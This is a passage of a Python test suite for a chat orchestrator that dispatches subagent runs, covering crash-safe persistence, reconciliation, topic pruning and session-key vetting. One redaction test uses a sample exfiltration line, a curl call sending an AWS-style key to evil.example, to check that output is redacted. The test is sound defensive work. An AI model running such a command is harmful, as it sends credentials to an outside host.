        assert refusal == "crew_app_session_unsupported"
        assert post.called, "the user was not told either"
        assert decide.await_count + decide.call_count == 0
        # An accepted message still reports acceptance as None.
        with patch.object(orch, "_post", return_value=True), \
             _slot_save(), patch.object(orch, "_decide", new=AsyncMock()):
            assert await orch.ingest(_slot(), "do thing B") is None

    @pytest.mark.asyncio
    async def test_crew_chat_does_not_import_the_dashboard_handler_tree(self) -> None:
        """Crew's module is imported at module scope by `slack.gateway`, so what
        `crew_chat` imports, a Slack-only gateway pays for before it binds.
        `handlers/__init__` eagerly loads the WHOLE handler tree, so reaching the
        spawn warm helper through `handlers.messaging` put that tree on the
        gateway's startup path — which is why the helper lives in `spawn_warm`.
        Measured in a SUBPROCESS: this test session has already imported
        everything, so an in-process check would always pass."""
        import os
        import subprocess
        import sys

        prog = (
            "import sys\n"
            "import kiro_crew.crew_chat  # noqa: F401\n"
            "bad = [m for m in sys.modules if m.startswith('kiro_crew.dashboard.handlers')]\n"
            "print('|'.join(sorted(bad)))\n"
        )
        # Resolve the tree UNDER TEST, not whatever `kiro_crew` the interpreter
        # would find on its own — a subprocess inherits no path from pytest, and
        # an installed copy would silently answer for a different revision.
        src_root = str(Path(crew_mod.__file__).resolve().parents[1])
        env = {**os.environ, "PYTHONPATH": src_root}
        r = subprocess.run([sys.executable, "-c", prog], capture_output=True,
                           text=True, env=env)
        assert r.returncode == 0, r.stderr[-2000:]
        leaked = [m for m in (r.stdout or "").strip().split("|") if m]
        assert leaked == [], f"crew_chat pulled the handler tree: {leaked}"

    @pytest.mark.asyncio
    async def test_a_dots_only_slot_is_refused_at_the_crew_entry_points(self) -> None:
        """`CrewStore` refuses a dots-only key, and that refusal is the LAST
        line — reached only once the tab exists and the user has typed, i.e. an
        unhandled 500 on every message it ever sends. The entry points answer
        first."""
        from kiro_crew.crew_chat import is_crew_capable_slot_key

        for bad in (".", "..", "...", ""):
            assert not is_crew_capable_slot_key(bad), bad
            with pytest.raises(ValueError, match="unsafe crew slot key"):
                CrewStore(bad)
        # A TRAILING dot is the collision the dots-only rule misses: Win32 strips
        # it, so `foo.` and `foo` are ONE directory there and two slots would
        # share a queue, each routing the other's requests. Reserved DEVICE names
        # cannot be created at all.
        for bad in ("foo.", "a.b.", "CON", "con", "nul", "COM1", "LPT9",
                    "CON.txt"):
            assert not is_crew_capable_slot_key(bad), bad
            with pytest.raises(ValueError, match="unsafe crew slot key"):
                CrewStore(bad)
        # Names that merely CONTAIN dots — or fold to a legal directory name at
        # all, like "/" -> "_" and "foo " -> "foo_" — are ordinary and must keep
        # working. `console` only STARTS with a reserved name, it is not one.
        for ok in ("a.b", "..a", "s1", "_._", "/", "foo ", "console",
                   "confidential", "CONS", "comport"):
            assert is_crew_capable_slot_key(ok), ok
            CrewStore(ok)

    @pytest.mark.asyncio
    async def test_straggler_failure_notice_waits_for_its_queue_write(self) -> None:
        """The notice says nothing was started. If it goes out before the
        `failed` states land, a crash in between leaves them `pending` on disk
        and the next start routes and executes them — after the user was told
        they would not run."""
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        st.add_msg("route me")
        orch._decide_attempts["s1"] = crew_mod._DECIDE_MAX_ATTEMPTS - 1
        order: list[str] = []
        real_wait = CrewStore.wait_for

        async def _wait(futures):  # type: ignore[no-untyped-def]
            order.append("write")
            return await real_wait(futures)

        with patch.object(CrewStore, "wait_for", staticmethod(_wait)), \
             patch.object(orch, "_post",
                          side_effect=lambda *a, **k: order.append("post") or True):
            assert await orch._settle_stragglers(slot) is False
        assert order.index("write") < order.index("post"), order
        assert CrewStore("s1").queue[0]["state"] == "failed"

    @pytest.mark.asyncio
    async def test_steer_is_durable_before_it_reaches_the_run(self) -> None:
        """Steering mutates a LIVE run and cannot be undone, so replaying it
        after a crash applies the same refinement twice. The intent must be on
        disk before the call, and the crash window must reconcile as
        'may not have applied' rather than replay."""
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("actually use TypeScript")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "running"
        t["active_run_id"] = "r1"
        seen_state: list[str | None] = []

        async def _steer(rid, text):  # type: ignore[no-untyped-def]
            # What a crash at this instant would leave behind on disk.
            seen_state.append((CrewStore("s1").entry(e["msg_id"]) or {}).get("state"))
            return True, ""

        orch._subagents.steer_run = AsyncMock(side_effect=_steer)
        with patch.object(orch, "_post"):
            await orch._apply(slot, st, {"do": "steer", "topic_id": "t1",
                                         "msg_id": e["msg_id"]})
        assert seen_state == ["steering"], \
            "the steer reached the run before its intent was durable"
        assert e["state"] == "steered"

    @pytest.mark.asyncio
    async def test_an_interrupted_steer_is_settled_visibly_not_replayed(self) -> None:
        """A `steering` entry is the window nobody can see into: the run may or
        may not have received the refinement. Reopening it to `pending` would
        apply it a second time, so it settles like an interrupted dispatch —
        once, and where the user can see it."""
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("actually use TypeScript")
        e["state"] = "steering"
        await CrewStore.wait_for(st.save())
        fresh = CrewStore("s1")
        orch._reconcile("s1", fresh)
        entry = fresh.entry(e["msg_id"]) or {}
        assert entry.get("state") == "stopped", "an interrupted steer was replayed"
        assert any("may not have reached" in (f.get("body") or "")
                   for f in fresh.forwards), "the user was never told"

    @pytest.mark.asyncio
    async def test_dispatch_runs_under_the_linked_session_not_the_tab(self) -> None:
        """`spawn()` vets the blast-radius capability against the parent session
        key, and the key's PREFIX picks the surface. A channel-linked slot that
        presented `dashboard:<tab>` was vetted against a surface nobody
        configured, so a channel whose profile forbids spawn got its subagents
        run anyway."""
        subagents = MagicMock()
        keys: list[str] = []
        subagents.spawn = MagicMock(
            side_effect=lambda *a, **k: keys.append(k.get("parent_session_key"))
            or _spawn_info("r1"))
        orch = _orch(subagents=subagents)
        slot = _slot()
        slot.linked_session_key = "slack:1785370133.085469"
        st = orch._store("s1")
        e = st.add_msg("build X")
        with patch.object(orch, "_post"):
            await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"],
                                         "title": "build X"})
        assert keys == ["slack:1785370133.085469"]

    @pytest.mark.asyncio
    async def test_continuation_and_respawn_carry_the_same_session_key(self) -> None:
        """A continuation re-enters the capability check, and the
        conversation_gone fallback spawns outright — both are governed dispatches,
        so keying either to the tab reopens the same hole one path over."""
        orch = _orch()
        slot = _slot()
        slot.linked_session_key = "telegram:4242"
        st = orch._store("s1")
        e = st.add_msg("follow up")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "idle"
        seen: list[str] = []
        orch._subagents.continue_conversation = MagicMock(
            side_effect=lambda cid, task, **kw: seen.append(kw.get("parent_session_key"))
            or _spawn_info("x", done=True, error="conversation_gone"))
        orch._subagents.spawn = MagicMock(
            side_effect=lambda task, **kw: seen.append(kw.get("parent_session_key"))
            or _spawn_info(kw["_preassigned_id"]))
        with patch.object(orch, "_post"):
            await orch._dispatch_continue(slot, st, t, e)
        assert seen == ["telegram:4242", "telegram:4242"]

    @pytest.mark.asyncio
    async def test_an_unlinked_slot_still_runs_under_its_dashboard_session(self) -> None:
        """The ordinary case must not move: an unlinked tab keeps the
        `dashboard:` key its profile and its restricted-key bookkeeping use."""
        subagents = MagicMock()
        keys: list[str] = []
        subagents.spawn = MagicMock(
            side_effect=lambda *a, **k: keys.append(k.get("parent_session_key"))
            or _spawn_info("r1"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("build X")
        with patch.object(orch, "_post"):
            await orch._apply(_slot(), st, {"do": "spawn", "msg_id": e["msg_id"],
                                            "title": "build X"})
        assert keys == ["dashboard:s1"]

    @pytest.mark.asyncio
    async def test_a_continuation_records_its_topic(self) -> None:
        # A continuation runs under a NEW run id while staying on the EXISTING
        # topic. Without a persisted topic_id, reconciliation cannot tell the two
        # apart and invents a second topic keyed by the run id.
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("follow up")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "idle"
        orch._subagents.continue_conversation = MagicMock(
            side_effect=lambda cid, task, **kw: _spawn_info(kw["_preassigned_id"]))
        await orch._dispatch_continue(slot, st, t, e)
        assert CrewStore("s1").entry(e["msg_id"])["topic_id"] == "t1"

    @pytest.mark.asyncio
    async def test_the_fallback_respawn_carries_a_durable_id(self) -> None:
        # conversation_gone respawns via `spawn`, which is a dispatch like any
        # other: without a persisted identity, a crash between the spawn and the
        # acceptance write leaves an id nothing can match, and reconciliation
        # re-executes the task.
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("do it")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "idle"
        orch._subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_gone"))
        on_disk: list[str | None] = []

        def _spawn(task, **kw):
            # The identity must be readable from a FRESH store at spawn time.
            on_disk.append((CrewStore("s1").entry(e["msg_id"]) or {}).get("dispatch_id"))
            assert kw.get("_preassigned_id"), "respawn must carry the id it persisted"
            return _spawn_info(kw["_preassigned_id"])

        orch._subagents.spawn = _spawn
        await orch._dispatch_continue(slot, st, t, e)
        assert on_disk and on_disk[0], "respawn identity was not durable before the spawn"
        assert st.entry(e["msg_id"])["run_id"] == on_disk[0]

    @pytest.mark.asyncio
    async def test_closed_slot_completion_awaits_its_write(self) -> None:
        # The callback's return is what tells the subagent layer the result was
        # handled, so returning before the executor write lands turns a crash
        # into a lost result.
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("task")
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "running"
        e["state"] = "accepted"
        e["run_id"] = "r1"
        st.save()
        orch._owned["r1"] = "s1"
        orch._state.get_slot = MagicMock(return_value=None)      # tab closed
        await orch.on_subagent_done(_spawn_info("r1", done=True, result="the result body"))
        # Read from a FRESH store: the forward must already be on disk.
        assert any("the result body" in f["body"] for f in CrewStore("s1").forwards)


class TestLiveRunIsReOwned:
    """The one case where re-owning is right: the run really is still executing."""

    def test_a_live_run_is_adopted_and_not_settled(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("still going")
        e["state"] = "accepted"
        e["dispatch_id"] = "alive001"
        st.save()
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=_spawn_info("alive001"))
        orch._state.get_slot = MagicMock(return_value=None)
        orch._reconcile("s1", st)
        assert st.entry(e["msg_id"])["state"] == "accepted"
        assert orch._owned.get("alive001") == "s1"
        assert not CrewStore("s1").forwards, "a live run must not be reported interrupted"


class TestTopicCap:
    """topics.json is read INLINE when a slot's store is first touched, so it must
    stay bounded — an unbounded file puts a growing parse on the event loop."""

    def test_idle_topics_are_pruned_oldest_first(self) -> None:
        st = CrewStore("s1")
        for i in range(crew_mod._TOPIC_IDLE_CAP + 25):
            t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
            t["status"] = "idle"
            t["last_activity"] = float(i)          # ascending: t0 is the oldest
        st.save()
        kept = {t["topic_id"] for t in CrewStore("s1").topics}
        assert len(kept) == crew_mod._TOPIC_IDLE_CAP
        assert "t0" not in kept and "t24" not in kept          # oldest dropped
        assert f"t{crew_mod._TOPIC_IDLE_CAP + 24}" in kept     # newest kept

    def test_running_and_held_topics_are_never_pruned(self) -> None:
        st = CrewStore("s1")
        old_running = st.add_topic("keep-running", "r1", "still working", "m1")
        old_running["status"] = "running"
        old_running["last_activity"] = 0.0                     # the oldest of all
        old_held = st.add_topic("keep-held", "r2", "has queued msgs", "m2")
        old_held["status"] = "idle"
        old_held["held"] = ["m9"]
        old_held["last_activity"] = 0.0
        for i in range(crew_mod._TOPIC_IDLE_CAP + 10):
            t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
            t["status"] = "idle"
            t["last_activity"] = float(i + 1)
        st.save()
        kept = {t["topic_id"] for t in CrewStore("s1").topics}
        assert "keep-running" in kept, "a running topic was pruned"
        assert "keep-held" in kept, "a topic still holding queued messages was pruned"

    def test_a_claimed_dispatch_pins_its_topic(self) -> None:
        """A dispatched-but-not-yet-running topic must survive the prune.

        A continuation is recorded `claimed` and made DURABLE BEFORE its side
        effect, and the topic only flips to `running` once the dispatch returns.
        In that window the topic looks idle, so the very save that persists the
        claim could prune the topic the claim points at — orphaning the result
        when it arrives. Every non-terminal state pins, for the same reason.
        """
        for pinning_state in ("claimed", "pending", "ask", "accepted"):
            st = CrewStore(f"pin-{pinning_state}")
            claimed = st.add_topic("keep-claimed", "r1", "dispatch in flight", "m1")
            claimed["status"] = "idle"                          # not yet running
            claimed["last_activity"] = 0.0                      # the oldest of all
            e = st.add_msg("the in-flight request")
            e["state"] = pinning_state
            e["topic_id"] = "keep-claimed"
            for i in range(crew_mod._TOPIC_IDLE_CAP + 10):
                t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
                t["status"] = "idle"
                t["last_activity"] = float(i + 1)
            st.save()
            kept = {t["topic_id"] for t in CrewStore(f"pin-{pinning_state}").topics}
            assert "keep-claimed" in kept, (
                f"a topic referenced by a {pinning_state} entry was pruned; "
                "its result would arrive with nowhere to land"
            )

    def test_a_terminal_entry_does_not_pin_its_topic(self) -> None:
        """The pin must not defeat the cap: a finished entry keeps its topic_id
        forever, so if terminal states pinned too, topics.json would grow without
        bound and put an ever-larger inline parse back on the event loop."""
        st = CrewStore("no-pin")
        done = st.add_topic("prunable", "r1", "long finished", "m1")
        done["status"] = "idle"
        done["last_activity"] = 0.0
        e = st.add_msg("finished request")
        e["state"] = "done"
        e["topic_id"] = "prunable"
        for i in range(crew_mod._TOPIC_IDLE_CAP + 10):
            t = st.add_topic(f"t{i}", f"r{i}", f"topic {i}", f"m{i}")
            t["status"] = "idle"
            t["last_activity"] = float(i + 1)
        st.save()
        kept = {t["topic_id"] for t in CrewStore("no-pin").topics}
        assert "prunable" not in kept
        assert len(kept) == crew_mod._TOPIC_IDLE_CAP


class TestContinuationIdentity:
    """A continuation must be recoverable by id after a crash mid-dispatch."""

    @pytest.mark.asyncio
    async def test_dispatch_id_is_durable_before_the_continue(self) -> None:
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("follow up on that")
        t = st.add_topic("t1", "r1", "topic", e["msg_id"])
        t["status"] = "idle"
        on_disk: list[str | None] = []

        def _continue(conv_id, task, **kw):
            # At the moment of the side effect, the id must already be readable
            # from a FRESH store — i.e. it reached the file, not just the object.
            fresh = CrewStore("s1")
            on_disk.append((fresh.entry(e["msg_id"]) or {}).get("dispatch_id"))
            assert kw.get("_preassigned_id"), "the caller must supply the id it persisted"
            return _spawn_info(kw["_preassigned_id"])

        orch._subagents.continue_conversation = _continue
        await orch._dispatch_continue(slot, st, t, e)
        assert on_disk and on_disk[0], "dispatch_id was not durable before the continue"
        assert e["run_id"] == on_disk[0], "the run adopted an id other than the persisted one"


class TestDurableRunEvidence:
    """Reconciliation must not treat a volatile registry's silence as proof."""

    def test_unknown_run_is_reopened_not_stranded(self) -> None:
        # An `accepted` entry whose run has no durable record never actually
        # started (the process died with the capacity queue), so it must be
        # reopened rather than left accepted forever.
        st = CrewStore("s1")
        e = st.add_msg("do the thing")
        e["state"] = "accepted"
        e["dispatch_id"] = "gone1234"
        st.save()
        orch = _orch()
        # A restart leaves the in-process registry empty — that emptiness is
        # exactly what must NOT be read as evidence either way.
        orch._subagents.get = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", return_value=None):
            orch._reconcile("s1", st)
        assert st.entry(e["msg_id"])["state"] == "pending"

    def test_durable_state_outvotes_an_empty_registry(self) -> None:
        # THE discriminating case. After a restart the registry is empty, so the
        # old volatile check concluded "never ran" and reopened the entry —
        # re-executing a task that had in fact started. Durable state knows
        # better, and is the only thing that can distinguish the two.
        st = CrewStore("s1")
        e = st.add_msg("mutating task")
        e["state"] = "claimed"
        e["dispatch_id"] = "started1"
        st.save()
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)      # restart: empty
        orch._state.get_slot = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", return_value={"id": "started1"}):
            orch._reconcile("s1", st)
        # NOT reopened: reopening would run the mutating task a second time.
        assert st.entry(e["msg_id"])["state"] != "pending"
        # And the user is told, rather than the task vanishing silently.
        assert any("interrupted" in f["body"] for f in CrewStore("s1").forwards)

    def test_a_failed_durable_lookup_fails_closed(self) -> None:
        # If the durable lookup itself errors we cannot prove the run never
        # started, so the safe answer is "assume it did" — never re-execute on an
        # unknown answer.
        st = CrewStore("s1")
        e = st.add_msg("mutating task")
        e["state"] = "claimed"
        e["dispatch_id"] = "unknown1"
        st.save()
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        orch._state.get_slot = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", side_effect=OSError("disk gone")):
            orch._reconcile("s1", st)
        assert st.entry(e["msg_id"])["state"] != "pending"

    def test_durably_recorded_run_is_not_re_dispatched(self) -> None:
        # Same shape, but state.json exists: the run DID start, so re-opening it
        # would re-execute a possibly-mutating task.
        st = CrewStore("s1")
        e = st.add_msg("do the thing")
        e["state"] = "claimed"
        e["dispatch_id"] = "live1234"
        st.save()
        orch = _orch()
        # A restart leaves the in-process registry empty — that emptiness is
        # exactly what must NOT be read as evidence either way.
        orch._subagents.get = MagicMock(return_value=None)
        orch._state.get_slot = MagicMock(return_value=None)   # tab not reopened yet
        with patch.object(crew_mod, "read_state", return_value={"id": "live1234"}):
            orch._reconcile("s1", st)
        # Started but no longer running: settled, NOT reopened (never re-execute)
        # and NOT left accepted forever (no completion is coming).
        assert st.entry(e["msg_id"])["state"] == "stopped"


# ── restart reconciliation ──


class TestReconcile:
    def test_interrupted_dispatch_reopens(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("m")
        e["state"] = "claimed"
        t = st.add_topic("t1", "r_dead", "topic", e["msg_id"])
        t["status"] = "running"
        st.save()
        subagents = MagicMock()
        subagents._agents = {}  # run not alive
        orch = _orch(subagents=subagents)
        st2 = orch._store("s1")
        assert st2.entry(e["msg_id"])["state"] == "pending"
        assert st2.topic("t1")["status"] == "idle"

    def test_live_run_reowned(self) -> None:
        st = CrewStore("s1")
        t = st.add_topic("t1", "r_live", "topic", "m0")
        t["status"] = "running"
        st.save()
        live = _spawn_info("r_live", done=False)
        subagents = MagicMock()
        subagents.get = MagicMock(return_value=live)
        orch = _orch(subagents=subagents)
        orch._store("s1")
        assert orch.owns("r_live")


# ── mode plumbing ──


class TestModePlumbing:
    def test_valid_modes_include_crew(self) -> None:
        from kiro_crew.dashboard.chat_folders import _VALID_MODES

        assert "crew" in _VALID_MODES


# ── adversarial-review regression fixes ──


class TestReviewFixes:
    """Regressions pinned from the adversarial review of 9b13c971."""

    def test_post_redacts_llm_output(self) -> None:
        # B1: _post is the sole delivery chokepoint and must redact.
        orch = _orch()
        slot = _slot()
        with patch.object(crew_mod, "redact_exfiltration_urls",
                          return_value=("[URL-REDACTED]", ["w"])) as r_url, \
             patch.object(crew_mod, "redact_credentials",
                          return_value=("[CRED-REDACTED]", ["w"])) as r_cred:
            orch._post(slot, "curl https://evil.example/?d=AKIA123")
        r_url.assert_called_once()
        r_cred.assert_called_once()
        assert slot.append.call_args.args[1] == "[CRED-REDACTED]"

    def test_post_fails_closed_when_redaction_raises(self) -> None:
        # B1 companion: never post raw content if redaction itself breaks.
        orch = _orch()
        slot = _slot()
        with patch.object(crew_mod, "redact_exfiltration_urls",
                          side_effect=RuntimeError("boom")):
            orch._post(slot, "secret")
        slot.append.assert_not_called()

    @pytest.mark.asyncio
    async def test_refused_respawn_does_not_wedge_topic(self) -> None:
        # B2 (Opus): conversation_gone → respawn refused must NOT be
        # recorded as a live topic (no completion will ever arrive).
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_gone: files expired"))
        subagents.spawn = MagicMock(
            return_value=_spawn_info("y", done=True, error="spawn refused: low memory"))
        orch = _orch(subagents=subagents)
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        with patch.object(orch, "_post") as post:
            await orch._dispatch_continue(slot, st, t, e)
        assert e["state"] == "pending"          # re-examinable, not accepted
        assert t["status"] != "running"         # not wedged
        assert not orch.owns("y")
        post.assert_called_once()               # R1: user-visible signal

    @pytest.mark.asyncio
    async def test_successful_respawn_records_run_id(self) -> None:
        # R3: the respawn path must set e["run_id"] so completion settles it.
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="resume_failed: no context"))
        subagents.spawn = MagicMock(return_value=_spawn_info("r9"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        await orch._dispatch_continue(_slot(), st, t, e)
        assert e["state"] == "accepted"
        assert e["run_id"] == "r9"
        assert t["active_run_id"] == "r9"

    @pytest.mark.asyncio
    async def test_stale_hold_on_idle_topic_dispatches(self) -> None:
        # B2 (GPT): a hold decided while running but applied after the topic
        # went idle must dispatch, not strand the message in held forever.
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r5"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("late follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"  # completed while the decision LLM was thinking
        await orch._apply(_slot(), st, {"do": "hold", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "accepted"
        assert t["status"] == "running"
        assert e["msg_id"] not in t.get("held", [])

    def test_reconcile_reopens_held_entries(self) -> None:
        # B2 (Opus) companion: restart must reopen held entries (their
        # dispatching completion may never arrive) and clear topic held
        # lists so nothing double-dispatches later.
        st = CrewStore("s1")
        e = st.add_msg("stuck")
        t = st.add_topic("t1", "r-dead", "topic", "m0")
        e["state"] = "held"
        t["held"] = [e["msg_id"]]
        st.save()
        subagents = MagicMock()
        subagents.get = MagicMock(return_value=None)  # run unknown after restart
        orch = _orch(subagents=subagents)
        st2 = orch._store("s1")  # triggers _reconcile
        e2 = st2.entry(e["msg_id"])
        assert e2["state"] == "pending"
        assert st2.topic("t1")["held"] == []
        assert st2.topic("t1")["status"] == "idle"

    def test_save_prunes_old_terminal_entries(self) -> None:
        # R2: queue.json must stay bounded — terminal entries beyond the cap
        # are pruned oldest-first; live entries are never pruned.
        st = CrewStore("s1")
        live = st.add_msg("still pending")
        for i in range(crew_mod._QUEUE_TERMINAL_CAP + 50):
            e = st.add_msg(f"old {i}")
            e["state"] = "done"
        st.save()
        terminal = [e for e in st.queue if e["state"] == "done"]
        assert len(terminal) == crew_mod._QUEUE_TERMINAL_CAP
        assert terminal[0]["text"] == "old 50"  # oldest 50 dropped
        assert st.entry(live["msg_id"]) is not None

    @pytest.mark.asyncio
    async def test_forward_persisted_before_post_and_cleared_after(self) -> None:
        # Server GPT finding: a crash between persist and post must not lose the
        # result. Still true with immediate delivery — the durable copy exists
        # while _post runs, and is cleared only once it returns.
        orch = _orch()
        slot = _slot()
        seen: list[list[str]] = []
        on_disk: list[list[str]] = []

        def _spy(_slot, _content, kind="crew"):
            seen.append([f["body"] for f in orch._store("s1").forwards])
            # Read the persisted copy straight off disk: this is what survives a
            # crash, and the whole point of awaiting the write before posting.
            fresh = CrewStore("s1")
            on_disk.append([f["body"] for f in fresh.forwards])
            return True          # `_post` reports delivery; this one succeeded

        with patch.object(orch, "_post", side_effect=_spy) as post:
            await orch._queue_forward(slot, "result body")
        post.assert_called_once()
        assert seen == [["result body"]]                  # in the store DURING the post
        assert orch._store("s1").forwards == []           # cleared after it
        # And the write was AWAITED, not merely queued: _save offloads to the
        # executor, so without the await a completion followed by process exit
        # would lose the result. Nothing may still be in flight by post time.
        assert on_disk == [["result body"]]                # it reached the file

    @pytest.mark.asyncio
    async def test_reconcile_redelivers_orphaned_forwards(self) -> None:
        # Crash between persist and post: reconcile re-delivers on restart.
        st = CrewStore("s1")
        st.add_forward("orphaned result")
        await st.wait_writes()  # durable before the "restarted" store reads disk
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        with patch.object(orch, "_post", return_value=True) as post:
            orch._store("s1")     # _reconcile SCHEDULES the replay (it is sync)
            await asyncio.sleep(0.05)          # let that task run
        post.assert_called_once()
        assert "orphaned result" in post.call_args.args[1]
        await orch._store("s1").wait_writes()
        assert CrewStore("s1").forwards == []


# ── gateway wiring (GPT review finding on faf5a127) ──


class TestGatewayCrewInit:
    """_init_crew must attach AFTER dashboard init — calling it while
    dashboard_state is None silently disabled crew mode on every real boot."""

    def test_init_crew_attaches_when_dashboard_ready(self) -> None:
        from kiro_crew.slack.gateway import GatewayOrchestrator

        g = MagicMock()
        g.dashboard_state = MagicMock()
        g.dashboard_state.crew = None
        GatewayOrchestrator._init_crew(g)
        assert g.dashboard_state.crew is not None
        assert isinstance(g.dashboard_state.crew, CrewOrchestrator)

    def test_init_crew_noop_without_dashboard(self) -> None:
        from kiro_crew.slack.gateway import GatewayOrchestrator

        g = MagicMock()
        g.dashboard_state = None
        GatewayOrchestrator._init_crew(g)  # must not raise

    def test_startup_sequence_orders_crew_after_dashboard(self) -> None:
        # Static guard: in the gateway start sequence, _init_crew() must be
        # invoked after _init_dashboard() (the original defect called the
        # attach logic from _init_subagents, which runs earlier).
        import inspect

        import kiro_crew.slack.gateway as gw

        src = inspect.getsource(gw)
        dash = src.index("await self._init_dashboard()")
        crew = src.index("self._init_crew()")
        assert crew > dash

    @pytest.mark.asyncio
    async def test_completion_settles_store_when_slot_closed(self) -> None:
        # GPT finding on 7d6f4d7a: closing a crew slot mid-run must not leave
        # the topic wedged in "running" — settle + persist before slot check.
        state = MagicMock()
        state.get_slot = MagicMock(return_value=None)  # slot closed
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("task")
        t = st.add_topic("t1", "r7", "topic", e["msg_id"])
        e["state"], e["run_id"] = "accepted", "r7"
        orch._owned["r7"] = "s1"
        info = _spawn_info("r7", done=True, result="<<<SUMMARY all done >>>")
        await orch.on_subagent_done(info)
        assert t["status"] == "idle"          # settled, not wedged
        assert e["state"] == "done"
        await st.wait_writes()
        assert CrewStore("s1").topic("t1")["digest"] == "all done"  # persisted

    @pytest.mark.asyncio
    async def test_stopped_run_not_recorded_as_done(self) -> None:
        # GPT finding on a5bf0464: user-stopped runs have empty error but
        # outcome="stopped" — must not be persisted as success.
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("task")
        t = st.add_topic("t9", "r9", "topic", e["msg_id"])
        e["state"], e["run_id"] = "accepted", "r9"
        orch._owned["r9"] = "s1"
        info = _spawn_info("r9", done=True, result="partial", outcome="stopped")
        with patch.object(orch, "_queue_forward") as qf:
            await orch.on_subagent_done(info)
        assert e["state"] == "stopped"
        assert t["digest"] == "Stopped at your request."
        assert "Stopped at your request." in qf.call_args.args[1]

    @pytest.mark.asyncio
    async def test_save_offloads_write_and_newest_wins(self) -> None:
        # GPT finding on 76d35e37: store writes must not block the event loop.
        # Inside a running loop, _save schedules the disk write to the
        # executor; wait_writes() is the barrier. Newest snapshot wins.
        st = CrewStore("s1")
        st.add_msg("m1")  # sync path in fixture? — no: we're in a loop here
        st.queue[0]["text"] = "final"
        st.save()
        await st.wait_writes()
        assert CrewStore("s1").queue[0]["text"] == "final"

    def test_save_writes_inline_without_loop(self) -> None:
        # Sync callers (boot reconcile, tests) still get immediate durability.
        st = CrewStore("s1")
        st.add_msg("hello")
        assert CrewStore("s1").entry(st.queue[0]["msg_id"]) is not None

    def test_post_appends_without_implicit_broadcast(self) -> None:
        # GPT finding on 120fd95e: the explicit chat_message frame is the
        # single broadcast — append must be called with broadcast=False.
        orch = _orch()
        slot = _slot()
        orch._post(slot, "hello")
        assert slot.append.call_args.kwargs.get("broadcast") is False
        orch._state.broadcast_ws.assert_called_once()

    @pytest.mark.asyncio
    async def test_ingest_persists_before_ack(self) -> None:
        # GPT finding on 120fd95e: the ack promises durability — the queue
        # entry must be on disk before the ack posts.
        #
        # Asserted as the PROPERTY rather than the order of two patched calls:
        # the earlier form traced `wait_writes`, which ingest no longer calls
        # (it awaits its own write by name), and its `_post` stub returned None
        # — so it also silently depended on `_post_durable`'s verdict being
        # ignored, which is the defect the sibling test now pins.
        orch = _orch()
        slot = _slot()
        on_disk_at_ack: list[list[str]] = []

        def _ack(*a: object, **k: object) -> bool:
            on_disk_at_ack.append([e["text"] for e in CrewStore("s1").queue])
            return True

        with patch.object(orch, "_post", side_effect=_ack), \
             _slot_save(), \
             patch.object(orch, "_decide", new=AsyncMock()):
            await orch.ingest(slot, "important request")
            await asyncio.sleep(0)
        assert on_disk_at_ack == [["important request"]]
        assert CrewStore("s1").queue[0]["text"] == "important request"

    @pytest.mark.asyncio
    async def test_failed_steer_on_idle_topic_dispatches(self) -> None:
        # GPT finding on 85f8fbe2: run completes during the steer await —
        # a failed steer must recheck status and continue, not hold forever.
        subagents = MagicMock()

        async def steer_and_complete(run_id: str, text: str):
            st.topic("t1")["status"] = "idle"  # completion raced the steer
            return False, "not_running"

        subagents.steer_run = steer_and_complete
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r8"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("correction")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "accepted"          # dispatched, not stranded
